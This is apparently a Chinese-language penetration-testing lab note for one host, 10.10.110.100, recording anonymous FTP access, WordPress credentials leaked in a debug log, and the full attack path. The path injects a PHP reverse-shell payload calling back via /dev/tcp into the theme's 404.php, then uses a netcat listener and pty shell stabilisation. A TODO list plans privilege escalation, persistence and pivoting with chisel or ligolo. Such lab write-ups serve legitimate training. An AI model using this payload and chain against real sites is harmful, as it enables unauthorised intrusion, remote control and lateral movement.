```markdown
# 🎯 10.10.110.100 - 初始 Web 服务器

## 🧾 基本信息

- 操作系统：Linux
- 主机名：未知
- 服务开放端口：
  - 21/tcp → FTP（匿名登录 ✅）
  - 65000/tcp → HTTP（WordPress 5.4.1）

---

## 🔍 信息收集与枚举

### 🌐 HTTP

- Web 服务运行在 **端口 65000**
- WordPress 安装在子路径 `/wordpress/`
- 后台登录地址：

```

[http://10.10.110.100:65000/wordpress/wp-login.php](http://10.10.110.100:65000/wordpress/wp-login.php)

```

- WordPress 版本：**5.4.1**
- debug log 路径泄露信息：
- 用户名：`james`
- 密码：`Toyota` ✅（首字母大写）

- 成功登录后台后可访问主题编辑器：

```

Appearance > Theme Editor > 404.php

````

---

### 📁 FTP 枚举

- 匿名登录成功：

```bash
ftp 10.10.110.100
Name: anonymous
Password: anonymous@
````

* 可读取部分目录，但无写权限

---

## 🧨 攻击路径

1. 使用 `james:Toyota` 登录 WP 后台

2. 打开 `Twenty Twenty` 主题 → `404.php`

3. 插入反弹 shell payload：

   ```php
   <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.4/4444 0>&1'"); ?>
   ```

4. 在本地监听：

   ```bash
   nc -lvnp 4444
   ```

5. 访问触发反弹（可任意 404 页面）：

   ```
   http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/404.php
   ```

6. 成功反弹 shell，当前用户为 `www-data`

---

## 🛠️ Shell 稳定化

在拿到 shell 后执行以下命令，修复终端问题：

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export PS1='\u@\h:\w\$ '
```

成功后获得类似完整 TTY 的效果。

---

## 📦 收集信息

* 用户：

  * `james`
  * `balthazar`
* 密码：

  * `james: Toyota`
* 文件：

  * `debug.log`（含凭证）
  * 上传的 shell 路径：`404.php`（或任意触发）
* 当前权限：`www-data`，未提权

---

## ✅ 当前状态

* 已成功登录后台
* 通过主题注入反弹 shell 成功上线
* Shell 已稳定处理，可用作渗透入口

---

## 📝 TODO

* [ ] 搜索提权方式（如 `sudo -l`, cron job）
* [ ] 部署持久化反弹 shell（如 ligolo agent）
* [ ] 记录上传路径和访问方式
* [ ] 用作入口机拓展内网代理（如 chisel/ligolo）

```
